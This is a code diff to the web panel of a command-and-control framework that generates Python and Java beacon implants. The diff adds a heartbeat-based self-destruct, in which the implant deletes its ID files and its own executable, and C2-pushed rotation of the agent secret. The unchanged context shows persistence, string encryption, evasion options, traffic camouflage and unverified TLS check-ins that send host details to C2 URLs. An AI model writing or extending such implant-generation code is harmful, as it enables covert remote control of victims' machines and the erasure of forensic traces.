@@ -159,6 +159,10 @@ const LANG = {
     gen_add_fallback:'+ Add fallback', gen_sleep:'Sleep (seconds)', gen_jitter:'Jitter %',
     gen_persist:'Persistence (survives reboots)', gen_kill_date:'Kill Date (optional)',
     gen_kill_date_hint:'Beacon self-destructs after this date. Leave empty for no limit.',
+    gen_hb_days:'Heartbeat timeout (days)', gen_hb_hint:'If C2 is unreachable for this many days the beacon self-destructs. 0 = disabled.',
+    sec_secret_title:'Agent Secret Rotation', sec_secret_desc:'Generates a new agent secret. Active beacons will receive the new secret on their next check-in and update automatically. The old secret stays valid until all beacons rotate.',
+    sec_secret_btn:'Rotate Secret', sec_secret_confirm:'This will generate a new agent secret. Active beacons will auto-update on next check-in. Continue?',
+    sec_secret_new:'New secret',
     gen_enc_mode:'String Encryption', gen_enc_server:'Server-side key delivery (strongest)', gen_enc_aes:'AES-256 / SHA-256 CTR (strong)', gen_enc_xor:'XOR (fast, basic)',
     gen_evasion:'Evasion',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent and real HTTP headers',
@@ -237,6 +241,10 @@ const LANG = {
     gen_add_fallback:'+ Agregar fallback', gen_sleep:'Sleep (segundos)', gen_jitter:'Jitter %',
     gen_persist:'Persistencia (sobrevive reinicios)', gen_kill_date:'Kill Date (opcional)',
     gen_kill_date_hint:'El beacon se autodestruye después de esta fecha. Vacío = sin límite.',
+    gen_hb_days:'Heartbeat timeout (días)', gen_hb_hint:'Si el C2 no responde en este número de días el beacon se autodestruye. 0 = desactivado.',
+    sec_secret_title:'Rotación de Agent Secret', sec_secret_desc:'Genera un nuevo agent secret. Los beacons activos recibirán el nuevo secret en su próximo check-in y se actualizarán automáticamente. El secret viejo sigue válido hasta que todos roten.',
+    sec_secret_btn:'Rotar Secret', sec_secret_confirm:'Se generará un nuevo agent secret. Los beacons activos se actualizan solos en el próximo check-in. ¿Continuar?',
+    sec_secret_new:'Nuevo secret',
     gen_enc_mode:'Cifrado de strings', gen_enc_server:'Llave desde servidor (máxima seguridad)', gen_enc_aes:'AES-256 / SHA-256 CTR (fuerte)', gen_enc_xor:'XOR (rápido, básico)',
     gen_evasion:'Evasión',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent y headers HTTP reales',
@@ -1718,6 +1726,12 @@ function renderGenerateView() {
             </div>
           </div>
           <div class="form-group" style="margin:0;margin-top:12px">
+            <label>${t('gen_hb_days')}</label>
+            <input type="number" id="gen-hb-days" min="0" max="365" value="0"
+              style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--font-mono);font-size:13px;padding:8px 12px;outline:none;width:100%">
+            <div style="margin-top:6px;font-size:11px;color:var(--text3);line-height:1.5">${t('gen_hb_hint')}</div>
+          </div>
+          <div class="form-group" style="margin:0;margin-top:12px">
             <label>${t('gen_enc_mode')}</label>
             <select id="gen-enc-mode" style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:8px 12px;outline:none;width:100%;cursor:pointer">
               <option value="server">${t('gen_enc_server')}</option>
@@ -2028,6 +2042,15 @@ async function renderSettingsView() {
               <div style="display:flex;align-items:center;gap:12px">
                 <button class="btn btn-sm" onclick="saveWhitelist()">${t('wl_save')}</button>
                 <span id="wl-status" style="font-size:12px;color:var(--text3)"></span>
+              </div>
+            </div>
+
+            <div class="info-card" style="margin:0;margin-top:16px">
+              <h3 style="margin:0 0 10px">🔑 ${t('sec_secret_title')}</h3>
+              <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">${t('sec_secret_desc')}</p>
+              <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+                <button class="btn btn-sm" onclick="rotateSecret()">${t('sec_secret_btn')}</button>
+                <span id="secret-status" style="font-size:11px;color:var(--text3);font-family:var(--font-mono)"></span>
               </div>
             </div>
           </div>
@@ -2431,6 +2454,16 @@ function setBeaconLang(lang) {
   document.getElementById('gen-output').style.display = 'none';
 }
 
+async function rotateSecret() {
+  if (!confirm(t('sec_secret_confirm'))) return;
+  const res = await apiFetch('/api/settings/rotate-secret', {method:'POST'});
+  const el = document.getElementById('secret-status');
+  if (!res || !res.ok) { el.style.color='var(--danger)'; el.textContent = 'Error'; return; }
+  const data = await res.json();
+  el.style.color = 'var(--success)';
+  el.textContent = `${t('sec_secret_new')}: ${data.new_secret}`;
+}
+
 async function generateBeacon() {
   const urls = [...document.querySelectorAll('.gen-url-input')]
     .map(i => i.value.trim()).filter(Boolean);
@@ -2439,6 +2472,7 @@ async function generateBeacon() {
   const jitter   = parseInt(document.getElementById('gen-jitter').value) || 20;
   const persist  = document.getElementById('gen-persist').checked;
   const killDate = document.getElementById('gen-kill-date').value.trim() || null;
+  const hbDays   = parseInt(document.getElementById('gen-hb-days').value) || 0;
   const encMode  = document.getElementById('gen-enc-mode').value;
   const ev = {
     traffic:    document.getElementById('ev-traffic').checked,
@@ -2469,12 +2503,12 @@ async function generateBeacon() {
 
   let code, filename;
   if (_beaconLang === 'java') {
-    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey);
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
     filename = 'Beacon.java';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
   } else {
-    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey);
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays);
     filename = 'beacon.py';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
     document.getElementById('beacon-dl-buttons-java').style.display = 'none';
@@ -2545,7 +2579,7 @@ function _sEnc(str, seed) {
   return Array.from(out).map(b=>b.toString(16).padStart(2,'0')).join('');
 }
 
-function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null) {
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -2727,6 +2761,8 @@ except ImportError:
 _WIN = sys.platform == 'win32'
 SLEEP  = ${sleep}
 JITTER = ${jitter}
+HB_DAYS = ${hbDays}
+_last_ok = time.time()
 ${killDateBlock}
 ${(encMode === 'aes' || encMode === 'server') ? `# SHA-256 CTR decoded at runtime — key derived via 3×SHA-256, each string has unique IV
 import hashlib as _hl
@@ -2829,7 +2865,7 @@ SSL_CTX.check_hostname = False
 SSL_CTX.verify_mode    = ssl.CERT_NONE
 
 def _post(path, data):
-    global _url_idx
+    global _url_idx, _last_ok
 ${postBodyLine}
     for i in range(len(C2_URLS)):
         url = C2_URLS[(_url_idx + i) % len(C2_URLS)]
@@ -2838,6 +2874,7 @@ ${postHeaders}
             r = _req.Request(url + path, data=body, headers=hdrs, method="POST")
             with _req.urlopen(r, context=SSL_CTX, timeout=15) as resp:
                 _url_idx = (_url_idx + i) % len(C2_URLS)
+                _last_ok = time.time()
                 return ${respParse}
         except Exception:
             continue
@@ -3146,8 +3183,17 @@ def _tunnel_tick():
                 try: ch['sock'].close()
                 except: pass
 
+def _self_destruct():
+    for _f in [_ID_FILE, _CWD_FILE]:
+        try: os.remove(_f)
+        except: pass
+    try: os.remove(os.path.abspath(__file__))
+    except: pass
+    sys.exit(0)
+
 def checkin():
-    return _post(${xPy('/api/beacon/checkin')}, {
+    global SECRET
+    _r = _post(${xPy('/api/beacon/checkin')}, {
         "agent_id":       AGENT_ID,
         "hostname":       socket.gethostname(),
         "ip_internal":    _local_ip(),
@@ -3157,10 +3203,13 @@ def checkin():
         "sleep_interval": SLEEP,
         "cwd":            _cwd,
     })
+    if _r and _r.get("new_secret"): SECRET = _r["new_secret"]
+    return _r
 
 def main():
     _t_tick = [0.0]
     while True:${killDateLoopCheck}
+        if HB_DAYS > 0 and time.time() - _last_ok > HB_DAYS * 86400: _self_destruct()
         try:
             resp = checkin()
             if resp and resp.get("task_id"):
@@ -3183,7 +3232,7 @@ if __name__ == "__main__":
 `;
 }
 
-function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null) {
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -3348,15 +3397,17 @@ public class Beacon {
     private static volatile String XK = null;` : `private static final String XK = "${xk}";
     private static final String[] _ENC_URLS = { ${eUrls.map(e => `"${e}"`).join(', ')} };
     private static final String[] C2_URLS;
-    private static final String SECRET;
+    private static volatile String SECRET;
     static {
         SECRET = xDec("${es}", XK);
         C2_URLS = new String[_ENC_URLS.length];
         for (int i = 0; i < _ENC_URLS.length; i++) C2_URLS[i] = xDec(_ENC_URLS[i], XK);
     }`}
 
-    private static final int SLEEP  = ${sleep};
-    private static final int JITTER = ${jitter};
+    private static final int SLEEP   = ${sleep};
+    private static final int JITTER  = ${jitter};
+    private static final int HB_DAYS = ${hbDays};
+    private static volatile long lastOk = System.currentTimeMillis();
     private static final Random rng = new Random();
 
     private static String agentId;
@@ -3496,11 +3547,23 @@ public class Beacon {
                 conn.getOutputStream().write(body);
                 byte[] respBytes = conn.getInputStream().readAllBytes();
                 urlIdx = (urlIdx + i) % C2_URLS.length;
+                lastOk = System.currentTimeMillis();
                 ${parseResp}
                 return respStr;
             } catch (Exception ignored) {}
         }
         return null;
+    }
+
+    // ── Self-destruct ─────────────────────────────────────────
+    private static void selfDestruct() {
+        try { new File(getBaseDir(), ${xL('.beacon_id')}).delete(); } catch (Exception ignored) {}
+        try { new File(getBaseDir(), ${xL('.beacon_cwd')}).delete(); } catch (Exception ignored) {}
+        try {
+            File jar = new File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+            jar.delete();
+        } catch (Exception ignored) {}
+        System.exit(0);
     }
 
     // ── Agent ID persistence ──────────────────────────────────
@@ -3569,7 +3632,12 @@ public class Beacon {
             "\\"pid\\":" + pid + "," +
             "\\"sleep_interval\\":" + SLEEP + "," +
             "\\"cwd\\":\\"" + jsonEscape(cwd) + "\\"}";
-        return post(${xL('/api/beacon/checkin')}, payload);
+        String resp = post(${xL('/api/beacon/checkin')}, payload);
+        if (resp != null) {
+            String ns = jsonGet(resp, "new_secret");
+            if (ns != null && !ns.isEmpty()) SECRET = ns;
+        }
+        return resp;
     }
 
     // ── Command execution ─────────────────────────────────────
@@ -3689,6 +3757,7 @@ public class Beacon {
         int sleepMs = SLEEP * 1000;
         while (true) {
             ${killDateLoopCheck}
+            if (HB_DAYS > 0 && System.currentTimeMillis() - lastOk > (long)HB_DAYS * 86400000L) selfDestruct();
             try {
                 String resp = checkin();
                 if (resp != null) {
